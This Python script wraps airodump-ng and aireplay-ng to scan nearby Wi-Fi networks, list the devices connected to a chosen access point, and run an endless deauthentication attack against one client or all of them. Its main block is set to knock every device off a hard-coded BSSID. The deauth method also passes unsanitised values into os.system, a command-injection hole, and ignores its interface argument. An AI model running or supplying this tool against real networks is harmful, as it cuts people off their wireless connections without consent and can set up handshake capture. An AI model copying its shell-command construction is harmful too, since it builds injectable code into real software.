import subprocess
import time
import signal
import os

class SudoWifi:
    """ scan all networks avalable it's scan for 30 seconds you can chang duration to scan for costom sec. """
    def scan_wifi(self,interface):
        duration=40 # here is scan duration
        bssid=None
        channel=None
        output_file = "scan_output-01.csv"
        
        # Construct the command
        command = [
            "sudo", "airodump-ng", interface,
            "--write-interval", "1", "--output-format", "csv", "--write", "scan_output"
        ]
        # Start the airodump-ng process
        process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"Started airodump-ng scan on {interface} for {duration} seconds...")

        # Wait for the specified duration
        time.sleep(duration)

        # Stop the process
        process.send_signal(signal.SIGINT)
        process.wait()
        print("Scan completed.")

        # Parse the output CSV
        networks = []
        try:
            with open(output_file, "r") as file:
                lines = file.readlines()

            # Parse networks from the CSV file
            for line in lines[2:]:  # Skip header rows
                fields = line.split(',')
                if len(fields) >= 14 and fields[0].strip():  # Check if it's a valid BSSID line
                    network_info = {
                        "BSSID": fields[0].strip(),
                        "CH" : fields[3].strip(),
                        "ESSID": fields[13].strip()
                    }
                    networks.append(network_info)

        except FileNotFoundError:
            print("Output file not found. Ensure airodump-ng is producing output.")
        # Clean up the output files generated by airodump-ng
        if os.path.exists(output_file):
            os.remove(output_file)
        if os.path.exists("scan_output-01.kismet.csv"):
            os.remove("scan_output-01.kismet.csv")

        return networks


    """ scan bssid/devices connected to spacify wifi network """
    def scan_with_bssid(self,interface, bssid, duration=60):
        output_file = "output_file-01.csv"
        
        # Construct the command
        command = [
            "sudo", "airodump-ng", interface,
            "--bssid", bssid,
            "--write-interval", "1", "--output-format", "csv", "--write", "output_file"
        ]

        # Start the airodump-ng process
        process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"Started airodump-ng scan on {interface} for BSSID {bssid} for {duration} seconds...")

        # Wait for the specified duration
        time.sleep(duration)

        # Stop the process
        process.send_signal(signal.SIGINT)
        process.wait()
        print("Scan with BSSID completed.")

        # Parse the output CSV for connected devices
        devices = []
        try:
            with open(output_file, "r") as file:
                lines = file.readlines()

            # Locate and parse devices connected to the specified BSSID
            parsing_devices = False
            for line in lines:
                if "Station MAC" in line:
                    parsing_devices = True
                    continue
                if parsing_devices:
                    fields = line.split(',')
                    if len(fields) >= 6:
                        device_info = {
                            "Station MAC": fields[0].strip(),
                        }
                        devices.append(device_info)

        except FileNotFoundError:
            print("Output file not found. Ensure airodump-ng is producing output.")

        # Clean up the output files generated by airodump-ng
        if os.path.exists(output_file):
            os.remove(output_file)
        if os.path.exists("output_file-01.kismet.csv"):
            os.remove("output_file-01.kismet.csv")

        return devices
    """ Deauth attack excuter """
    def deauth(self,interface,network_mac,device_mac=None,is_all=False):
        if is_all : 
            print(f"Deauth all devices from {network_mac} using aireplay ...")
            print("\033[92m(CTRL+C) to stop attack\033[0m")
            print("\033[94m")
            os.system(f"aireplay-ng --deauth 0 -D -a {network_mac} wlan0")
        else : 
            print(f"Deauth {device_mac} from {network_mac} using aireplay ...")
            print("\033[92m(CTRL_C) to stop attack\033[0m")
            print("\033[94m")
            os.system(f"aireplay-ng --deauth 0 -D -a {network_mac} -c {device_mac} wlan0")

if __name__ == "__main__":
    # Usage example
    results = SudoWifi()
    results.deauth("wlan0","04:BA:D6:18:9F:FA",is_all=True)
    #r=results.scan_wifi("wlan0")
    #for network in r:
     #   print(f"BSSID: {network['BSSID']}, ESSID: {network['ESSID']} channel : {network['CH']}")
    # Scan for devices connected to a specific BSSID
    #devices = results.scan_with_bssid("wlan0", "04:BA:D6:18:9F:FA")
    #for device in devices:
    #print(f"Station MAC: {device['Station MAC']}")